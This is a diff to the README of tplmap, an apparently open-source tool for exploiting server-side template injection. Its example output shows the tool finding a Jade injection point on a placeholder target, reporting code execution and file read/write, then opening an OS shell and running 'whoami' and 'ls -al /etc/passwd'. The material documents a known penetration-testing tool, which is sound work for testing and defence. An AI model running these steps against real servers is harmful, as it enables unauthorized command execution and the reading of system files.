@@ -15,35 +15,39 @@ Example
 --------
 
 ```
-$ ./tplmap.py -u 'http://www.target.com/?id=*'
-[+] Found placeholder in GET parameter 'inj'
+$ ./tplmap.py -u 'http://www.target.com/app?id=*'
+[+] Found placeholder in GET parameter 'id'
 [+] Testing reflection with tag ${} and variances to escape code context
-[+] Confirmed reflection with tag '${}' by Mako plugin
-[+] Confirmed reflection with tag '${}' by Freemarker plugin
+[+] Testing reflection with tag {{}} and variances to escape code context
+[+] Testing reflection with tag {} and variances to escape code context
+[+] Testing reflection with tag #set($p=)\n$p\n
+[+] Detected unreliable reflection with tag #set($p=)\n$p\n, continuing
+[+] Confirmed reflection with tag '\n= \n' by Jade plugin
 [+] Tplmap identified the following injection point:
 
-  Engine: Freemarker
-  Template: ${}
+  Engine: Jade
+  Template: \n= \n
   Context: text
   OS: linux
   Capabilities:
-    Code evaluation: no
+    Code evaluation: yes, javascript code
     OS command execution: yes
     File write: yes
     File read: yes
 
 [+] Rerun tplmap providing one of the following options:
     --os-cmd or --os-shell to access the underlying operating system
-    --file-write to upload files to the server
-    --file-read to download remote files
+    --upload LOCAL REMOTE to upload files to the server
+    --download REMOTE LOCAL to download remote files
 
-$ ./tplmap.py -u 'http://www.target.com/?id=*' --os-shell
+$ ./tplmap.py -u 'http://www.target.com/app?id=*' --os-shell
 [+] Run commands on the operating system.
 linux $ whoami
 www-data
 linux $ ls -al /etc/passwd
 -rw-r--r--  1 root  wheel  5925 16 Sep  2015 /etc/passwd
 linux $
+  
 ```
 
 Supported template engines
